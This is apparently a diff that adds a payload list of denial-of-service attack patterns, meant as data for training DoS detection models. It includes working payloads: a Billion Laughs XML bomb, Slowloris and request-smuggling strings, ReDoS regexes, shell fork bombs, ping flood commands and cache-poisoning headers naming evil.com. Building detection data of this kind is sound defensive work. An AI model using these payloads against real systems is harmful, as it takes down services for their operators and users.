@@ -1,0 +1,234 @@
+# Denial of Service (DoS) Attack Patterns
+# These patterns can be used for training and testing DoS attack detection models
+
+# HTTP Request Flooding
+GET / HTTP/1.1
+POST / HTTP/1.1
+HEAD / HTTP/1.1
+OPTIONS * HTTP/1.1
+TRACE / HTTP/1.1
+PUT /file.txt HTTP/1.1
+DELETE /file.txt HTTP/1.1
+CONNECT www.example.com:443 HTTP/1.1
+PROPFIND /resource HTTP/1.1
+
+# Slowloris attack patterns
+GET / HTTP/1.1\r\nX-a: b\r\n
+GET / HTTP/1.1\r\nHost: example.com\r\n
+GET / HTTP/1.1\r\nHost: example.com\r\nX-a: b\r\n
+POST / HTTP/1.1\r\nHost: example.com\r\nContent-Length: 10000\r\n
+
+# SlowPOST attack patterns
+POST / HTTP/1.1\r\nContent-Length: 1000000\r\n\r\nX=
+POST / HTTP/1.1\r\nContent-Length: 5000000\r\n\r\ndata=
+POST / HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 10000000\r\n\r\nparam=
+
+# HTTP Response Splitting
+Header: value\r\n\r\nHTTP/1.1 200 OK\r\n
+Cookie: data=value\r\n\r\nHTTP/1.1 200 OK\r\n
+Set-Cookie: session=data\r\n\r\nHTTP/1.1 200 OK\r\n
+
+# Large payload DoS
+POST / HTTP/1.1\r\nContent-Length: 999999999999\r\n
+POST / HTTP/1.1\r\nContent-Length: 99999999\r\n\r\ndata=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+{"data": "A".repeat(1000000)}
+<script>var a = "A".repeat(100000000);</script>
+
+# Resource exhaustion patterns
+{".": ".".repeat(100000)}
+{"1": {"2": {"3": {"4": {"5": {"6": {"7": {"8": {"9": {"10": {"11": {"12": {}}}}}}}}}}}}}
+{"a": ["a".repeat(1000000)]}
+{"a": [], "b": [], "c": [], "d": [], "e": [], "f": [], "g": [], "h": [], "i": [], "j": [], "k": [], "l": [], "m": [], "n": [], "o": [], "p": [], "q": [], "r": [], "s": [], "t": [], "u": [], "v": [], "w": [], "x": [], "y": [], "z": []}
+
+# ReDoS (Regular Expression DoS)
+aaaaaaaaaaaaaaaaaaaaaaaa!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!
+(a+)+$
+(a|aa)+
+(a|a?)+$
+(.*a){20}
+(a+)+b
+
+# XML Entity Expansion (Billion Laughs)
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+<!ENTITY lol "lol">
+<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+<!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+<!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+<!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+<!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+<!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+<!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+# XML Quadratic Blowup
+<?xml version="1.0"?>
+<!DOCTYPE kaboom [
+<!ENTITY a "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">
+]>
+<kaboom>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</kaboom>
+
+# Zip Bomb patterns
+50-MegaByte-File.txt.gz
+100-megabyte-file.zip
+1GB-file.zip
+10GB-file.tar.gz
+nested-zip-bomb.zip
+zip://file.zip/nested.zip/nested2.zip/file.txt
+
+# HashDoS patterns
+{"a": 1, "b": 2, ..., "z": 26, "aa": 27, "ab": 28, ...} # Large number of hash collisions
+
+# Memory exhaustion
+new Array(10000000).join("A")
+Buffer.alloc(10000000000)
+String.prototype.repeat(1000000000)
+"A".repeat(1000000000)
+
+# Fork bombs
+:(){ :|:& };:
+foo(){ foo|foo& }; foo
+%0|%0
+
+# Extreme URL lengths
+/page?param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+/search?q=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# CPU intensive operations
+?sleep=10000
+?timeout=300000
+?factorial=1000000
+?fibonacci=10000
+?prime=10000000
+
+# Network exhaustion
+ping 192.168.1.1 -l 65500 -n 1000000
+ping -s 65507 -c 100000 192.168.1.1
+
+# File descriptor exhaustion
+open("/dev/null") * 1000
+fopen("/dev/null", "r") * 1000
+
+# Database query overload
+SELECT * FROM users JOIN orders JOIN order_items JOIN products JOIN categories JOIN tags
+SELECT * FROM large_table WHERE column LIKE '%keyword%'
+SELECT * FROM table1 CROSS JOIN table2 CROSS JOIN table3
+
+# Algorithmic complexity attacks
+sort(array_with_worst_case_pattern)
+quicksort(array_with_worst_case_pivot)
+hash_table.insert(collision_keys)
+
+# Memory leaks
+for(i=0;i<1000000;i++) { array.push(new Array(10000)) }
+while(true) { localStorage.setItem('key'+Math.random(), 'A'.repeat(5000)) }
+
+# Thread pool exhaustion
+for(i=0;i<1000;i++) { new Thread(heavyTask).start() }
+ExecutorService.submit(heavyTask) * 1000
+
+# Connection pool exhaustion
+for(i=0;i<1000;i++) { db.getConnection() }
+getHttpConnection() * 1000
+
+# Distributed Denial of Service (DDoS) patterns
+SYN flood: TCP SYN packet * 1000000
+UDP flood: UDP packet * 1000000
+ICMP flood: ICMP echo request * 1000000
+HTTP flood: GET / HTTP/1.1 * 1000000
+DNS amplification: DNS query with spoofed source IP
+NTP amplification: NTP monlist command with spoofed source IP
+SMURF attack: ICMP echo request to broadcast address with spoofed source IP
+Fraggle attack: UDP echo request to broadcast address with spoofed source IP
+
+# SYN flood payloads
+[TCP Flags: SYN] [Window: 65535] [Urgent: 0]
+[TCP Flags: SYN] [Window: 1024] [Urgent: 0]
+[TCP Flags: SYN] [Window: 16384] [Urgent: 0]
+
+# DNS amplification payloads
+ANY example.com
+ANY isc.org
+RRSIG example.com
+
+# NTP amplification payloads
+monlist
+get_restrict
+reslist
+
+# Botnet DDoS signatures
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2.13) Gecko/20101203 Firefox/3.6.13
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Thunderbird/45.0
+User-Agent: LOIC/1.0
+User-Agent: DoSHTTP/1.0
+User-Agent: Mirai
+User-Agent: XerXes/2.0
+
+# HTTP request smuggling
+Transfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n
+Content-Length: 25\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n
+GET /example HTTP/1.1\r\nHost: example.com\r\nContent-Length: 44\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: example.com\r\n\r\n
+
+# Flash crowds (legitimate but high-volume traffic)
+?sale=blackfriday
+?event=launch
+?lottery=winner
+?product=newrelease
+
+# IoT device flooding
+MQTT CONNECT * 1000
+MQTT PUBLISH * 1000
+CoAP GET * 1000
+
+# Session exhaustion
+Cookie: PHPSESSID=RANDOM * 1000
+Cookie: JSESSIONID=RANDOM * 1000
+Cookie: ASP.NET_SessionId=RANDOM * 1000
+
+# Cache poisoning leads to DoS
+Host: example.com\r\nX-Forwarded-Host: evil.com
+Host: example.com\r\nX-Host: evil.com
+
+# Advanced memory exhaustion patterns
+Buffer.allocUnsafe(1073741824) // 1GB memory allocation
+new ArrayBuffer(1073741824) // 1GB memory allocation
+new Uint8Array(1073741824) // 1GB memory allocation
+
+# Slowdown by compression
+gzip(A * 1000000) // Compresses to a very small payload but expands on server
+compress(A * 1000000) // Similar behavior
+
+# Recursive function calls
+function bomb() { bomb(); } bomb();
+def bomb(): bomb() bomb()
+function factorial(n) { return n <= 1 ? 1 : n * factorial(n-1); } factorial(100000);
+
+# File upload DoS
+multipart/form-data with 1GB file
+multipart/form-data with 1000 files
+multipart/form-data with deeply nested zip file
+
+# Additional slow HTTP attacks
+GET / HTTP/1.1\r\nHost: example.com\r\nRange: bytes=0-1, 1-2, 2-3, ..., 1000000-1000001
+GET / HTTP/1.1\r\nHost: example.com\r\nAccept-Encoding: gzip, deflate, br, compress, identity, *;q=0
+GET / HTTP/1.1\r\nHost: example.com\r\nConnection: keep-alive\r\nKeep-Alive: timeout=1000, max=1000
+
+# WebSocket DoS
+ws://example.com/socket (Keep connection open without sending data)
+ws://example.com/socket (Send 1MB of data every second)
+ws://example.com/socket (Open 1000 connections simultaneously)
+
+# GraphQL query complexity DoS
+{ users { friends { friends { friends { friends { name email profile } } } } } }
+{ product(id:"1") { similar(first:1000) { similar(first:1000) { similar(first:1000) { name } } } } }
+
+# Advanced ReDoS patterns
+^(([a-z])+.)+[A-Z]([a-z])+$ // Email validation regex
+^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$ // Domain validation regex
+^(?=.*[A-Za-z])(?=.*\d)(?=.*[@$!%*#?&])[A-Za-z\d@$!%*#?&]{8,}$ // Password validation regex
